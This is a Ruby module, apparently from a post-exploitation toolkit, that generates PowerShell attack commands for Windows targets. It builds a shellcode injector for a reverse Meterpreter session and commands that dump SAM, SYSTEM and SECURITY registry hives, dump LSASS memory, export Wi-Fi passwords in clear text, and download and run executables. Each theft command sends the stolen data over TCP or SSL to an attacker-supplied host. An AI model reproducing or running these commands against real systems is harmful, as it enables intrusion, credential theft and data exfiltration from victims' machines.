#!/usr/bin/env ruby
module PowershellCommands
  def powershell_reverse_meterpreter(shellcode)
    powershell_command = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";})
    return powershell_command
  end
  def powershell_hash_dump(host,port,ssl=nil)
    random_folder = random_name_gen
    if ssl
      powershell_command = "$folder='#{victim_path}\\#{random_folder}';mkdir $folder;reg.exe save HKLM\\SAM $folder\\sam;reg.exe save HKLM\\SYSTEM $folder\\sys;reg.exe save HKLM\\SECURITY $folder\\sec;$files=dir $folder;foreach($file in $files){$reg_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName));$socket = New-Object Net.Sockets.TcpClient('#{host}', #{port.to_i});$stream = $socket.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$sslStream.AuthenticateAsClient('#{host}');$writer = new-object System.IO.StreamWriter($sslStream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($reg_file);$writer.flush();$socket.close()}"
    else
      powershell_command = "$folder='#{victim_path}\\#{random_folder}';mkdir $folder;reg.exe save HKLM\\SAM $folder\\sam;reg.exe save HKLM\\SYSTEM $folder\\sys;reg.exe save HKLM\\SECURITY $folder\\sec;$files=dir $folder;foreach($file in $files){$reg_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($reg_file);$writer.flush();$socket.close()}"
    end
    return powershell_command
  end
  def powershell_lsass_dump(host,port,random_name,ssl=nil)
    lsass_dump = "c:\\windows\\temp\\#{random_name}.dmp"
    if ssl
      powershell_command1 = %($proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2; $FileStream = New-Object IO.FileStream("#{lsass_dump}", [IO.FileMode]::Create);$Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));exit)
      powershell_command2 = %($lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{lsass_dump}"));$socket = New-Object Net.Sockets.TcpClient('#{host}', #{port.to_i});$stream = $socket.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$sslStream.AuthenticateAsClient('#{host}');$writer = new-object System.IO.StreamWriter($sslStream);$writer.WriteLine('lsass');$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
    else
      powershell_command1 = %($proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2; $FileStream = New-Object IO.FileStream("#{lsass_dump}", [IO.FileMode]::Create);$Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));exit)
      powershell_command2 = %($lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{lsass_dump}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("lsass");$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
    end
    return powershell_command1,powershell_command2
  end
  def powershell_wget_powershell(web_server,executable)
    user_pick = Readline.readline("#{get_input("Would you like to add an argument?[yes/no] ")}",true)
    if user_pick == 'yes'
      arguments = Readline.readline("#{get_input("Input the argument: ")}",true)
      powershell_command = %($arg='#{arguments}';$web=new-object System.Net.WebClient;$web.DownloadFile('http://#{web_server}/#{executable}', 'c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable} $arg)
    else
      powershell_command = %($web=new-object System.Net.WebClient;$web.DownloadFile('http://#{web_server}/#{executable}', 'c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable})
    end
    return powershell_command
  end
  def powershell_hex_to_bin(read_path,write_path)
    powershell_command = %($hex_string=[io.file]::ReadAllBytes("#{read_path}");$byte_array=$hex_string -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}};[System.IO.WriteAllBytes(#{write_path},$byte_array);Start-Process #{write_path})
    return powershell_command
  end
  def powershell_wifi_dump(host,port,priv=nil,ssl=nil)
    directory = random_name_gen
    if ssl and priv
      powershell_command = "$savedir='c:\\windows\\temp\\#{directory}\\';mkdir $savedir;netsh wlan export profile folder=$savedir key=clear;$files=dir $savedir;foreach($file in $files){$xml=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName);$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$writer = new-object System.IO.StreamWriter($stream);$sslStream.AuthenticateAsClient('#{host}');$writer = new-object System.IO.StreamWriter($sslStream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($xml);$writer.flush();$socket.close()}"
    elsif ssl
      powershell_command = "$savedir='c:\\windows\\temp\\#{directory}\\';mkdir $savedir;netsh wlan export profile folder=$savedir;$files=dir $savedir;foreach($file in $files){$xml=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName);$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$writer = new-object System.IO.StreamWriter($stream);$sslStream.AuthenticateAsClient('#{host}');$writer = new-object System.IO.StreamWriter($sslStream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($xml);$writer.flush();$socket.close()}"
    elsif priv
      powershell_command = "$savedir='c:\\windows\\temp\\#{directory}\\';mkdir $savedir;netsh wlan export profile folder=$savedir key=clear;$files=dir $savedir;foreach($file in $files){$xml=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName);$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($xml);$writer.flush();$socket.close()}"
    else
      powershell_command = "$savedir='c:\\windows\\temp\\#{directory}\\';mkdir $savedir;netsh wlan export profile folder=$savedir;$files=dir $savedir;foreach($file in $files){$xml=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName);$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($xml);$writer.flush();$socket.close()}"
    end
    return powershell_command
  end
end
